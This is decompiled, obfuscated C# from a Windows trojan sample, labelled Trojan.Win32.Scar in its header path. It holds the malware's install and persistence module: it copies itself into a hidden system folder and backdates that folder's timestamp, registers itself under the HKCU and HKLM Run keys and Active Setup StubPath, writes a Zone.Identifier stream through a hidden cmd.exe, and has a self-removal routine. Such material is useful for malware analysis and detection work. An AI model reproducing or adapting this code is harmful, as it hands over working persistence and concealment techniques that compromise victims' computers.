// Decompiled with JetBrains decompiler
// Type: ᭂ൱ễᯧ੻ಱាᮇᢑښᖡኞ׼ด.̗᧣ᝥ᤹ƽ᭱ྱᐦ
// Assembly: trraaa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 832C03EF-4027-4148-8669-9B38E84E6716
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Scar.mtzz-552836309c43a6339ff0b708baff33dc65ab36ff3b98038d01dbd0c96ae605cc.exe

using \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace \u1B42\u0D71ễᯧ\u0A7Bಱាᮇᢑښᖡኞ\u05FCด
{
  internal class \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ
  {
    public static void \u1BB5ᗣฅມ\u0C7Eዹঞ\u1943ᶓᝋᅹᔾᯂᅈ\u02F7۶\u19E4ᜒ੨()
    {
      if (Process.GetCurrentProcess().MainModule.FileName != Path.Combine(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709, ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)))
      {
        \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ឩᵑ\u0384ཬྂה\u086B();
        \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.म\u088A\u19E0᷋ᬽվᢊ();
      }
      \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.\u05C8ॺໞนᄜ͑ᡝᏩ();
    }

    private static void ឩᵑ\u0384ཬྂה\u086B()
    {
      try
      {
        Directory.CreateDirectory(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709);
      }
      catch
      {
      }
      try
      {
        File.WriteAllBytes(Path.Combine(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709, ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)), ᥘĘᛢᛅкPӝ\u0885၁.ẄႸ\u0BD6ऺ\u08CEăáྖ᭱Ꮿѻᢓ);
      }
      catch
      {
      }
      try
      {
        if (ᥘĘᛢᛅкPӝ\u0885၁.ࢪᅷȋᴱ\u0DCCၮᆩᗔʈഊ\u0B4Aᰍཞ)
        {
          Random random = new Random();
          int day = random.Next(1, 28);
          int month = random.Next(1, 12);
          int year = random.Next(2000, 2012);
          Directory.SetCreationTime(Path.Combine(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709, ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)), new DateTime(year, month, day));
        }
      }
      catch
      {
      }
      if (ᥘĘᛢᛅкPӝ\u0885၁.ɣᐧ\u1AD4֭ƛଚ\u177A\u0BCFத๑ِᶶᙑΘᒩᕌṞ\u19E7͕)
      {
        try
        {
          File.SetAttributes(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
        }
        catch
        {
        }
      }
      if (!ᥘĘᛢᛅкPӝ\u0885၁.\u1CFCʸရᢆ\u000Aხ\u074C)
        return;
      try
      {
        File.SetAttributes(Path.Combine(ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709, ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.ڼᣖଧԎህừቀ\u1AF8\u17ED(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)), FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
      }
      catch
      {
      }
    }

    public static void \u05C8ॺໞนᄜ͑ᡝᏩ()
    {
      try
      {
        if (ᥘĘᛢᛅкPӝ\u0885၁.ᆦਅ\u05BEỜঠ೩దؐᛦᔡ၁ণ\u0839)
          Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u02DFᰡ\u1B6Aըἣ, true), (object) (ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709 + "\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)));
      }
      catch
      {
      }
      try
      {
        if (ᥘĘᛢᛅкPӝ\u0885၁.ᚺ\u0EE5\u17FEॵ\u0EA9\u0027ᐌॾটẝϢᢁ\u0FD0Ḉ)
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u02DFᰡ\u1B6Aըἣ, true), (object) (ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709 + "\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)));
      }
      catch
      {
      }
      try
      {
        if (!ᥘĘᛢᛅкPӝ\u0885၁.\u1C82Ꮂ\u09FFྒँỜጕכ᪂ኽᄿࣲᒒᬹಉ)
          return;
        RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u137Bୢ\u0FC0\u16EDؘψ, true));
        subKey.SetValue("StubPath", (object) (ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709 + "\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true)));
        subKey.SetValue("IsInstalled", (object) 1, RegistryValueKind.DWord);
      }
      catch
      {
      }
    }

    private static void म\u088A\u19E0᷋ᬽվᢊ()
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          FileName = "cmd.exe",
          UseShellExecute = false,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        process.Start();
        StreamWriter standardInput = process.StandardInput;
        StreamReader standardOutput = process.StandardOutput;
        standardInput.WriteLine("cd " + ᥘĘᛢᛅкPӝ\u0885၁.నᘓ\u0CDCஅ\u0709);
        standardInput.WriteLine("echo [zoneTransfer]ZoneID = 2 > " + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u1978ęƪܘกவ\u0E66Ⴅճ̱s, true) + ":ZONE.identifier");
        standardInput.Close();
        standardOutput.Close();
        process.Close();
        process.Kill();
      }
      catch
      {
      }
    }

    public static void \u083Bᨄì\u0D56\u003C\u175Fඦፄީݰ\u180Aᅯᢺଞ()
    {
      try
      {
        Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u02DFᰡ\u1B6Aըἣ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").DeleteValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.Ɨҗᅓ\u19F3Ǭìቼොᴝ\u1AA0ᯠ, true));
      }
      catch
      {
      }
      try
      {
        Registry.LocalMachine.DeleteSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u137Bୢ\u0FC0\u16EDؘψ, true));
      }
      catch
      {
      }
      try
      {
        switch (ᥘĘᛢᛅкPӝ\u0885၁.\u0DFDᅖᰕஉ\u00B1ሩિ)
        {
          case RegistryHive.CurrentUser:
            Registry.CurrentUser.DeleteSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ);
            break;
          case RegistryHive.LocalMachine:
            Registry.LocalMachine.DeleteSubKey(ᥘĘᛢᛅкPӝ\u0885၁.ເᘆᏔዸᗭᔠ);
            break;
        }
      }
      catch
      {
      }
      \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ݴኸ͏ᮬన\u05F6ėᤸा᠕ổጐᆪϋᩕᝧᡒ\u1AC1ဌ();
    }

    public static void ݴኸ͏ᮬన\u05F6ėᤸा᠕ổጐᆪϋᩕᝧᡒ\u1AC1ဌ()
    {
      try
      {
        string tempFileName = Path.GetTempFileName();
        File.Delete(tempFileName);
        File.Move(Process.GetCurrentProcess().MainModule.FileName, tempFileName);
        ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.\u0662ʀᵔႧ\u0970ړ\u19E6ਣᴇ\u0DE2ې\u098Eૂୂᰫ᜴ᜢ᳜\u0F2E(tempFileName, (string) null, ᶌᡆᖕ\u0FCAᅻᶋઋեΛҔ\u098E\u0BF8.ᇔٍ\u0EE1ػᅸሧႽग़ᜃÐ\u009AẸ.\u1771ᘗẗԧ᠗ᝫᑩᩈ݂ངཿᤍ۝ਧቲݵЅไ);
      }
      catch (Exception ex)
      {
      }
    }

    public bool ڻᖑᄘộ\u0606\u08BFᬍ\u0D58(\u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ളေͰͰᢡ\u0A44ߵ\u1777 _param1)
    {
      try
      {
        switch (_param1)
        {
          case \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ളေͰͰᢡ\u0A44ߵ\u1777.ഠಟᣁ\u086F\u1C8A\u1AC2\u0F14Ꮚੳႇ\u07F7̼:
            return Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").GetValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u02DFᰡ\u1B6Aըἣ, true)) != null;
          case \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ളေͰͰᢡ\u0A44ߵ\u1777.ڨᚷȬᵙả᠐ෞˣ\u07BC:
            return Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").GetValue(ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.Ɨҗᅓ\u19F3Ǭìቼොᴝ\u1AA0ᯠ, true)) != null;
          case \u0317\u19E3ᝥ᤹ƽ᭱ྱᐦ.ളေͰͰᢡ\u0A44ߵ\u1777.\u000Bඹɛᝫዄ\u0AD3\u060AᘞఐƓә̅\u0AB4:
            return Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\" + ݒ\u187DᰧᵅՐଆݶ\u02F2Φ.Ἶ᱃\u104DʝᦙƺᅴඛÙጯ᭓ᄔ\u03A2ᴼጎ(ᥘĘᛢᛅкPӝ\u0885၁.\u137Bୢ\u0FC0\u16EDؘψ, true)) != null;
        }
      }
      catch
      {
      }
      return false;
    }

    public enum ളေͰͰᢡ\u0A44ߵ\u1777
    {
      ഠಟᣁ\u086F\u1C8A\u1AC2\u0F14Ꮚੳႇ\u07F7̼,
      ڨᚷȬᵙả᠐ෞˣ\u07BC,
      \u000Bඹɛᝫዄ\u0AD3\u060AᘞఐƓә̅\u0AB4,
    }
  }
}
